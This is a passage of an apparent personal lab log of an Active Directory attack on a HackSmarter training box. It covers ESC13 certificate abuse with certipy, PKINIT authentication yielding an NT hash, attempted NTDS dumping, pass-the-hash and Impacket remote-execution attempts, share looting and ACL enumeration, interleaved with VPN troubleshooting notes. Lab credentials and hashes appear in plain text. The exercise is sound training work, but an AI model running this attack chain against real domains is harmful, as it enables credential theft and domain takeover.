+**Conclusion so far:** basic SMB/LDAP/Kerberos all work cleanly over the tunnel, but every RPC-over-SMB named-pipe *write* (the actual CSR payload in `certipy req`) times out — reproduced across a full lab reset, a new DC IP, VPN MTU 1500/1000/800, and OpenVPN forced to TCP transport. Client-side variables are exhausted; this looks like something on HackSmarter's infra blocking/mangling RPC cert-enrollment traffic specifically (security appliance, broken DCE/RPC NAT/ALG, or the CA service unreachable from the lab VPN egress). **Next step: contact HackSmarter support** with box (Kitsune), user (`ranch`), template (`Kitsune-User` via `kitsune-DC01-CA`), the exact `certipy req` timeout, and the list of things already ruled out above.
+
+### Follow-up: killed VPN + fresh config (per staff advice in #lab-course-support)
+Staff member Tyler Ramsbey resolved a similar-looking "network looks broken" report in Discord by having the user `sudo killall openvpn`, wait 3-5 min, download a fresh VPN config, and reconnect. Tried the same here:
+```bash
+sudo killall openvpn
+# downloaded fresh .ovpn, reconnected
+certipy req -u 'ranch@kitsune.local' -p 'R@nch2026!' -dc-ip 10.1.79.35 -target-ip 10.1.79.35 -ca 'kitsune-DC01-CA' -template 'Kitsune-User' -key-size 4096 -debug
+...
+[!] Failed to connect to endpoint ncacn_np:10.1.79.35[\pipe\cert]: [Errno Connection error (10.1.79.35:445)] [Errno 111] Connection refused
+```
+First retry hit an immediate "Connection refused" (vs. the usual timeout) — turned out to be transient, not a stale IP: `nxc smb 10.1.79.35 -u ranch -p 'R@nch2026!'` succeeded immediately after. Re-ran `certipy req` right after confirming SMB was up, and got the **same original failure signature**: connects, authenticates, opens `\pipe\cert`, then `writeFile` (the CSR write) times out with `NetBIOSTimeout`.
+
+**Confirmed: fresh VPN + fresh DC IP does not fix it.** Every client-side variable is now exhausted (lab reset, new DC IP, fresh VPN config/process, MTU 1500/1000/800, TCP-mode VPN, static + dynamic RPC endpoints). Posting to `#lab-course-support` next.
+
+### Posted to Discord, staff response: "infra is good, isolation issue on your end"
+Investigated the "isolation on your end" angle:
+
+**Noticed the failure point alternates** across runs — sometimes the CSR `writeFile` times out, sometimes the response `readFile` times out. Not a fixed-threshold PMTU blackhole (that would fail at the same stage every time) — looks more like generic intermittent connectivity/timing issue.
+
+**Tried TCP MSS clamping on tun0** (bypasses PMTUD, forces smaller segments from the start):
+```bash
+sudo iptables -t mangle -A OUTPUT -o tun0 -p tcp --syn -j TCPMSS --set-mss 1200
+```
+No change — still timed out (write stage this time).
+
+**Tried kernel-level PMTU black-hole detection:**
+```bash
+sudo sysctl -w net.ipv4.tcp_mtu_probing=2
+```
+No change — still timed out (read stage this time).
+
+**Checked collected BloodHound loot for an alternate privesc path** (e.g. Shadow Credentials via AddKeyCredentialLink, which would avoid RPC cert enrollment entirely and only need Kerberos/LDAP): `ranch` has **zero outgoing ACL edges** in the dataset — no GenericWrite, AddKeyCredentialLink, ownership, etc. ESC13 via actual CA enrollment is the only path; no shortcut available.
+
+**Control test #1 — phone tether (own phone):** initially inconclusive (VPN wasn't actually connected on first 2 attempts). After confirming VPN was up (`nxc smb` succeeded), retried `certipy req` — same failure signature reproduced.
+
+**Control test #2 — a different phone/network entirely (friend's device):** confirmed VPN/SMB working first (`nxc smb` returned the real success line), then ran `certipy req` — **identical failure reproduced**: connects to `\pipe\cert`, this time the CSR write succeeds, but the response `readFile` times out with `NetBIOSTimeout`.
+
+**Conclusion:** The exact same RPC-stall bug now reproduces across at least two independent networks/devices (home connection + two different phone tethers on presumably different carriers), with VPN/SMB connectivity independently confirmed working each time. This is solid evidence against a client-side/ISP-specific cause. Pushing back to Tyler/staff with this as confirmed cross-network reproduction, alongside everything else already ruled out (lab reset, fresh VPN, MTU 1500/1000/800, TCP-mode VPN, MSS clamping, PMTU probing, static+dynamic RPC endpoints, no alternate ACL-based privesc path available).
+
+#### Trying again
+```bash
+[manthan@manthanbhatt Kitsune]$ for i in $(seq 1 30); do 
+> echo "Attempt $i"
+> certipy req -dc-ip 10.1.79.35 -u 'ranch' -p 'R@nch2026!' -ca 'kitsune-DC01-CA' -template 'Kitsune-User' -key-size 4096
+> sleep 3
+> done
+```
+All failed
+
+```bash
+manthan@manthanbhatt Kitsune]$ certipy req -dc-ip 10.1.79.35 -u 'ranch' -p 'R@nch2026!' -ca 'kitsune-DC01-CA' -template 'Kitsune-User' -ns 10.1.79.35 -key-size 4096
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[-] Got error: The NETBIOS connection with the remote host timed out.
+[-] Use -debug to print a stacktrace
+[manthan@manthanbhatt Kitsune]$ 
+```
+
+### Finally succeeded (intermittent — same command, immediate retry)
+```bash
+[manthan@manthanbhatt Kitsune]$ certipy req -u 'ranch' -p 'R@nch2026!' -dc-ip 10.1.79.35 -ca 'kitsune-DC01-CA' -template ' Kitsune-User' -key-size 4096 -debug
+...
+[+] Connected to endpoint: ncacn_np:10.1.79.35[\pipe\cert]
+[-] Got error: The NETBIOS connection with the remote host timed out.
+[manthan@manthanbhatt Kitsune]$ certipy req -u 'ranch' -p 'R@nch2026!' -dc-ip 10.1.79.35 -ca 'kitsune-DC01-CA' -template ' Kitsune-User' -key-size 4096 -debug
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[+] Nameserver: '10.1.79.35'
+[+] DC IP: '10.1.79.35'
+[+] DC Host: None
+[+] Target IP: '10.1.79.35'
+[+] Remote Name: '10.1.79.35'
+[+] Domain: ''
+[+] Username: 'RANCH'
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Trying to connect to endpoint: ncacn_np:10.1.79.35[\pipe\cert]
+[+] Connected to endpoint: ncacn_np:10.1.79.35[\pipe\cert]
+[*] Request ID is 21
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'ranch@kitsune.local'
+[+] Found SID in security extension: 'S-1-5-21-3773590124-4237107295-2360938966-1103'
+[*] Certificate object SID is 'S-1-5-21-3773590124-4237107295-2360938966-1103'
+[*] Saving certificate and private key to 'ranch.pfx'
+[*] Wrote certificate and private key to 'ranch.pfx'
+[manthan@manthanbhatt Kitsune]$ 
+```
+The RPC stall was genuinely intermittent server-side — the very next retry of the identical command succeeded outright. Got `ranch.pfx` with the ESC13 issuance-policy cert. Next: use this cert to authenticate (PKINIT) and pick up the `HelpDesk` group membership it grants.
+
+```bash
+[manthan@manthanbhatt Kitsune]$ certipy auth -pfx ranch.pfx -dc-ip 10.1.79.35
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'ranch@kitsune.local'
+[*]     Security Extension SID: 'S-1-5-21-3773590124-4237107295-2360938966-1103'
+[*] Using principal: 'ranch@kitsune.local'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'ranch.ccache'
+[*] Wrote credential cache to 'ranch.ccache'
+[*] Trying to retrieve NT hash for 'ranch'
+[*] Got hash for 'ranch@kitsune.local': aad3b435b51404eeaad3b435b51404ee:47d29308446189faa2acec65586963c1
+[manthan@manthanbhatt Kitsune]$ 
+```
+
+`Hash for Ranch`
+```
+ranch@kitsune.local: aad3b435b51404eeaad3b435b51404ee:47d29308446189faa2acec65586963c1
+```
+
+```bash
+[manthan@manthanbhatt Kitsune]$ nxc smb DC01.kitsune.local -u 'ranch' -H aad3b435b51404eeaad3b435b51404ee:47d29308446189faa2acec65586963c1 --ntds
+SMB         10.1.79.35      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
+SMB         10.1.79.35      445    DC01             [+] kitsune.local\ranch:47d29308446189faa2acec65586963c1 
+SMB         10.1.79.35      445    DC01             [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+SMB         10.1.79.35      445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         10.1.79.35      445    DC01             [-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
+[manthan@manthanbhatt Kitsune]$ 
+```
+
+```bash
+[manthan@manthanbhatt Kitsune]$ nxc smb 10.1.79.35 --use-kcache 
+SMB         10.1.79.35      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
+SMB         10.1.79.35      445    DC01             [+] KITSUNE.LOCAL\ranch from ccache 
+[manthan@manthanbhatt Kitsune]$ 
+```
+
+```bash
+[manthan@manthanbhatt Kitsune]$ nxc smb 10.1.79.35 --use-kcache  -x whoami
+SMB         10.1.79.35      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
+SMB         10.1.79.35      445    DC01             [+] KITSUNE.LOCAL\ranch from ccache 
+```
+
+```bash
+[manthan@manthanbhatt Kitsune]$ nxc smb 10.1.79.35 --use-kcache  --local-groups
+SMB         10.1.79.35      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
+SMB         10.1.79.35      445    DC01             [+] KITSUNE.LOCAL\ranch from ccache 
+SMB         10.1.79.35      445    DC01             [*] Enumerating with SAMRPC protocol
+SMB         10.1.79.35      445    DC01             [+] Enumerated local groups
+SMB         10.1.79.35      445    DC01             544 - Administrators
+SMB         10.1.79.35      445    DC01             545 - Users
+SMB         10.1.79.35      445    DC01             546 - Guests
+SMB         10.1.79.35      445    DC01             550 - Print Operators
+SMB         10.1.79.35      445    DC01             551 - Backup Operators
+SMB         10.1.79.35      445    DC01             552 - Replicator
+SMB         10.1.79.35      445    DC01             555 - Remote Desktop Users
+SMB         10.1.79.35      445    DC01             556 - Network Configuration Operators
+SMB         10.1.79.35      445    DC01             558 - Performance Monitor Users
+SMB         10.1.79.35      445    DC01             559 - Performance Log Users
+SMB         10.1.79.35      445    DC01             562 - Distributed COM Users
+SMB         10.1.79.35      445    DC01             568 - IIS_IUSRS
+SMB         10.1.79.35      445    DC01             569 - Cryptographic Operators
+SMB         10.1.79.35      445    DC01             573 - Event Log Readers
+SMB         10.1.79.35      445    DC01             574 - Certificate Service DCOM Access
+SMB         10.1.79.35      445    DC01             575 - RDS Remote Access Servers
+SMB         10.1.79.35      445    DC01             576 - RDS Endpoint Servers
+SMB         10.1.79.35      445    DC01             577 - RDS Management Servers
+SMB         10.1.79.35      445    DC01             578 - Hyper-V Administrators
+SMB         10.1.79.35      445    DC01             579 - Access Control Assistance Operators
+SMB         10.1.79.35      445    DC01             580 - Remote Management Users
+SMB         10.1.79.35      445    DC01             582 - Storage Replica Administrators
+SMB         10.1.79.35      445    DC01             585 - OpenSSH Users
+SMB         10.1.79.35      445    DC01             549 - Server Operators
+SMB         10.1.79.35      445    DC01             548 - Account Operators
+SMB         10.1.79.35      445    DC01             554 - Pre-Windows 2000 Compatible Access
+SMB         10.1.79.35      445    DC01             557 - Incoming Forest Trust Builders
+SMB         10.1.79.35      445    DC01             560 - Windows Authorization Access Group
+SMB         10.1.79.35      445    DC01             561 - Terminal Server License Servers
+SMB         10.1.79.35      445    DC01             517 - Cert Publishers
+SMB         10.1.79.35      445    DC01             553 - RAS and IAS Servers
+SMB         10.1.79.35      445    DC01             571 - Allowed RODC Password Replication Group
+SMB         10.1.79.35      445    DC01             572 - Denied RODC Password Replication Group
+SMB         10.1.79.35      445    DC01             1101 - DnsAdmins
+[manthan@manthanbhatt Kitsune]$ 
+```
+
+```bash
+[manthan@manthanbhatt Kitsune]$ nxc smb dc01.kitsune.local --use-kcache -x whoami   
+SMB         dc01.kitsune.local 445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
+SMB         dc01.kitsune.local 445    DC01             [+] KITSUNE.LOCAL\ranch from ccache 
+[manthan@manthanbhatt Kitsune]$ nxc smb dc01.kitsune.local --use-kcache --exec-method smbexec -x whoami
+SMB         dc01.kitsune.local 445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
+SMB         dc01.kitsune.local 445    DC01             [+] KITSUNE.LOCAL\ranch from ccache 
+[manthan@manthanbhatt Kitsune]$ 
+```
+
+```bash
+[manthan@manthanbhatt Kitsune]$ nxc smb dc01.kitsune.local -H 'aad3b435b51404eeaad3b435b51404ee:47d29308446189faa2acec65586963c1' -x whoami
+SMB         10.1.79.35      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
+[manthan@manthanbhatt Kitsune]$ 
+```
+
+```bash
+[manthan@manthanbhatt Kitsune]$ psexec.py -k -no-pass ranch@dc01.kitsune.local
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on dc01.kitsune.local.....
+[-] share 'ADMIN$' is not writable.
+[-] share 'C$' is not writable.
+[*] Found writable share Files
+[*] Uploading file uTbJdPvt.exe
+[*] Opening SVCManager on dc01.kitsune.local.....
+[-] Error opening SVCManager on dc01.kitsune.local.....
+[-] Error performing the installation, cleaning up: Unable to open SVCManager
+[manthan@manthanbhatt Kitsune]$ 
+```
+
+```bash
+[manthan@manthanbhatt Kitsune]$ wmiexec.py -k -no-pass ranch@dc01.kitsune.local
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] SMBv3.0 dialect used
+[-] WMI Session Error: code: 0x80041003 - WBEM_E_ACCESS_DENIED
+[manthan@manthanbhatt Kitsune]$ 
+```
+
+```bash
+[manthan@manthanbhatt Kitsune]$ smbexec.py -k -no-pass ranch@dc01.kitsune.local
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+```
+
+```bash
+[manthan@manthanbhatt Kitsune]$ atexec.py -k -no-pass ranch@dc01.kitsune.local
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[!] This will work ONLY on Windows >= Vista
+[-] You need to specify a command to execute!
+[manthan@manthanbhatt Kitsune]$ 
+```
+
+```bash
+[manthan@manthanbhatt Kitsune]$ nxc smb DC01.kitsune.local --use-kcache --shares WRITE
+SMB         DC01.kitsune.local 445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
+SMB         DC01.kitsune.local 445    DC01             [+] KITSUNE.LOCAL\ranch from ccache 
+SMB         DC01.kitsune.local 445    DC01             [*] Enumerated shares
+SMB         DC01.kitsune.local 445    DC01             Share           Permissions            Remark
+SMB         DC01.kitsune.local 445    DC01             -----           -----------            ------
+SMB         DC01.kitsune.local 445    DC01             Files           READ,WRITE             Global file share
+```
+
+Same old share (hash:hellokitty)
+```bash
+[manthan@manthanbhatt ranch_smb]$ smbclient //dc01.kitsune.local/Files -U ranch%R@nch2026!
+Can't load /etc/samba/smb.conf - run testparm to debug it
+Try "help" to get a list of possible commands.
+smb: \> mget *
+Get file 10-11-Calendar_October.pdf? y
+getting file \10-11-Calendar_October.pdf of size 3190 as 10-11-Calendar_October.pdf (1.8 KiloBytes/sec) (average 1.8 KiloBytes/sec)
+Get file 10-11-Financial_Report.pdf? y
+getting file \10-11-Financial_Report.pdf of size 4076 as 10-11-Financial_Report.pdf (2.2 KiloBytes/sec) (average 2.0 KiloBytes/sec)
+Get file 10-11-Timesheet.pdf? y
+getting file \10-11-Timesheet.pdf of size 3854 as 10-11-Timesheet.pdf (2.0 KiloBytes/sec) (average 2.0 KiloBytes/sec)
+Get file logins.psafe3? y
+getting file \logins.psafe3 of size 840 as logins.psafe3 (0.5 KiloBytes/sec) (average 1.7 KiloBytes/sec)
+smb: \> 
+```
+
+```bash
+[manthan@manthanbhatt Kitsune]$ bloodyad -d kitsune.local -u ranch --host DC01.kitsune.local -k get writable --right ALL --detail
+
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=kitsune,DC=local
+url: WRITE
+wWWHomePage: WRITE
+
+distinguishedName: CN=ranch,CN=Users,DC=kitsune,DC=local
+thumbnailPhoto: WRITE
+pager: WRITE
+mobile: WRITE
+homePhone: WRITE
+userSMIMECertificate: WRITE
+msDS-ExternalDirectoryObjectId: WRITE
+msDS-cloudExtensionAttribute20: WRITE
+msDS-cloudExtensionAttribute19: WRITE
+msDS-cloudExtensionAttribute18: WRITE
+msDS-cloudExtensionAttribute17: WRITE
+msDS-cloudExtensionAttribute16: WRITE
+msDS-cloudExtensionAttribute15: WRITE
+msDS-cloudExtensionAttribute14: WRITE
+msDS-cloudExtensionAttribute13: WRITE
+msDS-cloudExtensionAttribute12: WRITE
+msDS-cloudExtensionAttribute11: WRITE
+msDS-cloudExtensionAttribute10: WRITE
+msDS-cloudExtensionAttribute9: WRITE
+msDS-cloudExtensionAttribute8: WRITE
+msDS-cloudExtensionAttribute7: WRITE
+msDS-cloudExtensionAttribute6: WRITE
+msDS-cloudExtensionAttribute5: WRITE
+msDS-cloudExtensionAttribute4: WRITE
+msDS-cloudExtensionAttribute3: WRITE
+msDS-cloudExtensionAttribute2: WRITE
+msDS-cloudExtensionAttribute1: WRITE
+msDS-GeoCoordinatesLongitude: WRITE
+msDS-GeoCoordinatesLatitude: WRITE
+msDS-GeoCoordinatesAltitude: WRITE
+msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE
+msPKI-CredentialRoamingTokens: WRITE
+msDS-FailedInteractiveLogonCountAtLastSuccessfulLogon: WRITE
+msDS-FailedInteractiveLogonCount: WRITE
+msDS-LastFailedInteractiveLogonTime: WRITE
+msDS-LastSuccessfulInteractiveLogonTime: WRITE
+msDS-SupportedEncryptionTypes: WRITE
+msPKIAccountCredentials: WRITE
+msPKIDPAPIMasterKeys: WRITE
+msPKIRoamingTimeStamp: WRITE
+mSMQDigests: WRITE
+mSMQSignCertificates: WRITE
+userSharedFolderOther: WRITE
+userSharedFolder: WRITE
+url: WRITE
+otherIpPhone: WRITE
+ipPhone: WRITE
+assistant: WRITE
+primaryInternationalISDNNumber: WRITE
+primaryTelexNumber: WRITE
+otherMobile: WRITE
+otherFacsimileTelephoneNumber: WRITE
+userCert: WRITE
+homePostalAddress: WRITE
+personalTitle: WRITE
+wWWHomePage: WRITE
+otherHomePhone: WRITE
+streetAddress: WRITE
+otherPager: WRITE
+info: WRITE
+otherTelephone: WRITE
+userCertificate: WRITE
+preferredDeliveryMethod: WRITE
+registeredAddress: WRITE
+internationalISDNNumber: WRITE
+x121Address: WRITE
+facsimileTelephoneNumber: WRITE
+teletexTerminalIdentifier: WRITE
+telexNumber: WRITE
+telephoneNumber: WRITE
+physicalDeliveryOfficeName: WRITE
+postOfficeBox: WRITE
+postalCode: WRITE
+postalAddress: WRITE
+street: WRITE
+st: WRITE
+l: WRITE
+c: WRITE
+
+distinguishedName: CN=schlop,CN=Users,DC=kitsune,DC=local
+ms-net-ieee-80211-GroupPolicy: CREATE_CHILD
+nTFRSSubscriptions: CREATE_CHILD
+classStore: CREATE_CHILD
+ms-net-ieee-8023-GroupPolicy: CREATE_CHILD
+shadowFlag: WRITE
+shadowExpire: WRITE
+shadowInactive: WRITE
+shadowWarning: WRITE
+shadowMax: WRITE
+shadowMin: WRITE
+shadowLastChange: WRITE
+loginShell: WRITE
+unixHomeDirectory: WRITE
+gecos: WRITE
+gidNumber: WRITE
+uidNumber: WRITE
+msSFU30NisDomain: WRITE
+msSFU30Name: WRITE
+labeledURI: WRITE
+userPKCS12: WRITE
+preferredLanguage: WRITE
+thumbnailLogo: WRITE
+thumbnailPhoto: WRITE
+middleName: WRITE
+departmentNumber: WRITE
+carLicense: WRITE
+jpegPhoto: WRITE
+audio: WRITE
+pager: WRITE
+mobile: WRITE
+secretary: WRITE
+homePhone: WRITE
+manager: WRITE
+photo: WRITE
+roomNumber: WRITE
+mail: WRITE
+textEncodedORAddress: WRITE
+uid: WRITE
+userSMIMECertificate: WRITE
+msDS-SupersededManagedAccountLink: WRITE
+msDS-SupersededServiceAccountState: WRITE
+msDS-preferredDataLocation: WRITE
+msDS-ObjectSoa: WRITE
+msDS-SourceAnchor: WRITE
+msDS-KeyCredentialLink: WRITE
+msDS-ExternalDirectoryObjectId: WRITE
+msDS-AssignedAuthNPolicy: WRITE
+msDS-AssignedAuthNPolicySilo: WRITE
+msDS-SyncServerUrl: WRITE
+msDS-CloudAnchor: WRITE
+msDS-cloudExtensionAttribute20: WRITE
+msDS-cloudExtensionAttribute19: WRITE
+msDS-cloudExtensionAttribute18: WRITE
+msDS-cloudExtensionAttribute17: WRITE
+msDS-cloudExtensionAttribute16: WRITE
+msDS-cloudExtensionAttribute15: WRITE
+msDS-cloudExtensionAttribute14: WRITE
+msDS-cloudExtensionAttribute13: WRITE
+msDS-cloudExtensionAttribute12: WRITE
+msDS-cloudExtensionAttribute11: WRITE
+msDS-cloudExtensionAttribute10: WRITE
+msDS-cloudExtensionAttribute9: WRITE
+msDS-cloudExtensionAttribute8: WRITE
+msDS-cloudExtensionAttribute7: WRITE
+msDS-cloudExtensionAttribute6: WRITE
+msDS-cloudExtensionAttribute5: WRITE
+msDS-cloudExtensionAttribute4: WRITE
+msDS-cloudExtensionAttribute3: WRITE
+msDS-cloudExtensionAttribute2: WRITE
+msDS-cloudExtensionAttribute1: WRITE
+msDS-GeoCoordinatesLongitude: WRITE
+msDS-GeoCoordinatesLatitude: WRITE
+msDS-GeoCoordinatesAltitude: WRITE
+msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE
+msDS-PrimaryComputer: WRITE
+msTSSecondaryDesktops: WRITE
+msTSPrimaryDesktop: WRITE
+msDS-LastKnownRDN: WRITE
+isRecycled: WRITE
+msPKI-CredentialRoamingTokens: WRITE
+msDS-NcType: WRITE
+msTSLSProperty02: WRITE
+msTSLSProperty01: WRITE
+msTSManagingLS4: WRITE
+msTSLicenseVersion4: WRITE
+msTSExpireDate4: WRITE
+msTSManagingLS3: WRITE
+msTSLicenseVersion3: WRITE
+msTSExpireDate3: WRITE
+msTSManagingLS2: WRITE
+msTSLicenseVersion2: WRITE
+msTSExpireDate2: WRITE
+msDS-HABSeniorityIndex: WRITE
+msTSManagingLS: WRITE
+msTSLicenseVersion: WRITE
+msTSExpireDate: WRITE
+msTSProperty02: WRITE
+msTSProperty01: WRITE
+msTSInitialProgram: WRITE
+msTSWorkDirectory: WRITE
+msTSDefaultToMainPrinter: WRITE
+msTSConnectPrinterDrives: WRITE
+msTSConnectClientDrives: WRITE
+msTSBrokenConnectionAction: WRITE
+msTSReconnectionAction: WRITE
+msTSMaxIdleTime: WRITE
+msTSMaxConnectionTime: WRITE
+msTSMaxDisconnectionTime: WRITE
+msTSRemoteControl: WRITE
+msTSAllowLogon: WRITE
+msTSHomeDrive: WRITE
+msTSHomeDirectory: WRITE
+msTSProfilePath: WRITE
+msDS-FailedInteractiveLogonCountAtLastSuccessfulLogon: WRITE
+msDS-FailedInteractiveLogonCount: WRITE
+msDS-LastFailedInteractiveLogonTime: WRITE
+msDS-LastSuccessfulInteractiveLogonTime: WRITE
+msDS-SupportedEncryptionTypes: WRITE
+msDS-AuthenticatedAtDC: WRITE
+msDS-PhoneticDisplayName: WRITE
+msDS-PhoneticCompanyName: WRITE
+msDS-PhoneticDepartment: WRITE
+msDS-PhoneticLastName: WRITE
+msDS-PhoneticFirstName: WRITE
+msDS-SecondaryKrbTgtNumber: WRITE
+msRADIUS-SavedFramedIpv6Route: WRITE
+msRADIUS-FramedIpv6Route: WRITE
+msRADIUS-SavedFramedIpv6Prefix: WRITE
+msRADIUS-FramedIpv6Prefix: WRITE
+msRADIUS-SavedFramedInterfaceId: WRITE
+msRADIUS-FramedInterfaceId: WRITE
+unixUserPassword: WRITE
+msPKIAccountCredentials: WRITE
+msPKIDPAPIMasterKeys: WRITE
+msPKIRoamingTimeStamp: WRITE
+msDS-SourceObjectDN: WRITE
+msDRM-IdentityCertificate: WRITE
+msDS-AllowedToDelegateTo: WRITE
+msIIS-FTPDir: WRITE
+msIIS-FTPRoot: WRITE
+lastLogonTimestamp: WRITE
+msDS-Site-Affinity: WRITE
+msDS-Cached-Membership-Time-Stamp: WRITE
+msDS-Cached-Membership: WRITE
+msCOM-UserPartitionSetLink: WRITE
+mS-DS-CreatorSID: WRITE
+mS-DS-ConsistencyChildCount: WRITE
+mS-DS-ConsistencyGuid: WRITE
+otherWellKnownObjects: WRITE
+dSCorePropagationData: WRITE
+accountNameHistory: WRITE
+proxiedObjectName: WRITE
+msRASSavedFramedRoute: WRITE
+msRASSavedFramedIPAddress: WRITE
+msRASSavedCallbackNumber: WRITE
+msRADIUSServiceType: WRITE
+msRADIUSFramedRoute: WRITE
+msRADIUSFramedIPAddress: WRITE
+msRADIUSCallbackNumber: WRITE
+msNPSavedCallingStationID: WRITE
+msNPCallingStationID: WRITE
+msNPAllowDialin: WRITE
+mSMQSignCertificatesMig: WRITE
+mSMQDigestsMig: WRITE
+mSMQDigests: WRITE
+mSMQSignCertificates: WRITE
+uSNSource: WRITE
+terminalServer: WRITE
+isCriticalSystemObject: WRITE
+altSecurityIdentities: WRITE
+lastKnownParent: WRITE
+aCSPolicyName: WRITE
+servicePrincipalName: WRITE
+userSharedFolderOther: WRITE
+userSharedFolder: WRITE
+url: WRITE
+otherIpPhone: WRITE
+ipPhone: WRITE
+partialAttributeDeletionList: WRITE
+lockoutTime: WRITE
+userPrincipalName: WRITE
+legacyExchangeDN: WRITE
+assistant: WRITE
+otherMailbox: WRITE
+mhsORAddress: WRITE
+primaryInternationalISDNNumber: WRITE
+primaryTelexNumber: WRITE
+otherMobile: WRITE
+otherFacsimileTelephoneNumber: WRITE
+userCert: WRITE
+showInAddressBook: WRITE
+partialAttributeSet: WRITE
+wellKnownObjects: WRITE
+sIDHistory: WRITE
+dynamicLDAPServer: WRITE
+systemFlags: WRITE
+fSMORoleOwner: WRITE
+desktopProfile: WRITE
+groupPriority: WRITE
+groupsToIgnore: WRITE
+sAMAccountType: WRITE
+wbemPath: WRITE
+division: WRITE
+defaultClassStore: WRITE
+controlAccessRights: WRITE
+logonCount: WRITE
+groupMembershipSAM: WRITE
+lmPwdHistory: WRITE
+accountExpires: WRITE
+comment: WRITE
+rid: WRITE
+adminCount: WRITE
+revision: WRITE
+operatorCount: WRITE
+profilePath: WRITE
+userParameters: WRITE
+supplementalCredentials: WRITE
+securityIdentifier: WRITE
+primaryGroupID: WRITE
+preferredOU: WRITE
+pwdLastSet: WRITE
+ntPwdHistory: WRITE
+otherLoginWorkstations: WRITE
+unicodePwd: WRITE
+userWorkstations: WRITE
+maxStorage: WRITE
+logonWorkstation: WRITE
+logonHours: WRITE
+scriptPath: WRITE
+localeID: WRITE
+dBCSPwd: WRITE
+lastLogon: WRITE
+lastLogoff: WRITE
+badPasswordTime: WRITE
+homeDrive: WRITE
+homeDirectory: WRITE
+flags: WRITE
+employeeID: WRITE
+countryCode: WRITE
+codePage: WRITE
+badPwdCount: WRITE
+userAccountControl: WRITE
+replUpToDateVector: WRITE
+replPropertyMetaData: WRITE
+objectGUID: WRITE
+name: WRITE
+homePostalAddress: WRITE
+personalTitle: WRITE
+employeeType: WRITE
+employeeNumber: WRITE
+msExchHouseIdentifier: WRITE
+msExchLabeledURI: WRITE
+USNIntersite: WRITE
+wWWHomePage: WRITE
+networkAddress: WRITE
+msExchAssistantName: WRITE
+displayNamePrintable: WRITE
+garbageCollPeriod: WRITE
+otherHomePhone: WRITE
+uSNDSALastObjRemoved: WRITE
+streetAddress: WRITE
+extensionName: WRITE
+adminDescription: WRITE
+proxyAddresses: WRITE
+adminDisplayName: WRITE
+showInAdvancedViewOnly: WRITE
+company: WRITE
+department: WRITE
+co: WRITE
+uSNLastObjRem: WRITE
+uSNChanged: WRITE
+otherPager: WRITE
+repsFrom: WRITE
+repsTo: WRITE
+info: WRITE
+objectVersion: WRITE
+dSASignature: WRITE
+isDeleted: WRITE
+uSNCreated: WRITE
+otherTelephone: WRITE
+displayName: WRITE
+subRefs: WRITE
+whenChanged: WRITE
+whenCreated: WRITE
+attributeCertificateAttribute: WRITE
+houseIdentifier: WRITE
+dn: WRITE
+x500uniqueIdentifier: WRITE
+generationQualifier: WRITE
+initials: WRITE
+givenName: WRITE
+userCertificate: WRITE
+userPassword: WRITE
+seeAlso: WRITE
+preferredDeliveryMethod: WRITE
+destinationIndicator: WRITE
+registeredAddress: WRITE
+internationalISDNNumber: WRITE
+x121Address: WRITE
+facsimileTelephoneNumber: WRITE
+teletexTerminalIdentifier: WRITE
+telexNumber: WRITE
+telephoneNumber: WRITE
+physicalDeliveryOfficeName: WRITE
+postOfficeBox: WRITE
+postalCode: WRITE
+postalAddress: WRITE
+businessCategory: WRITE
+description: WRITE
+title: WRITE
+ou: WRITE
+o: WRITE
+street: WRITE
+st: WRITE
+l: WRITE
+c: WRITE
+serialNumber: WRITE
+sn: WRITE
+objectCategory: WRITE
+sAMAccountName: WRITE
+objectSid: WRITE
+nTSecurityDescriptor: WRITE
+instanceType: WRITE
+cn: WRITE
+objectClass: WRITE
+OWNER: WRITE
+DACL: WRITE
+
+distinguishedName: DC=kitsune.local,CN=MicrosoftDNS,DC=DomainDnsZones,DC=kitsune,DC=local
+dnsNode: CREATE_CHILD
+dnsZoneScopeContainer: CREATE_CHILD
+
+distinguishedName: DC=_msdcs.kitsune.local,CN=MicrosoftDNS,DC=ForestDnsZones,DC=kitsune,DC=local
+dnsNode: CREATE_CHILD
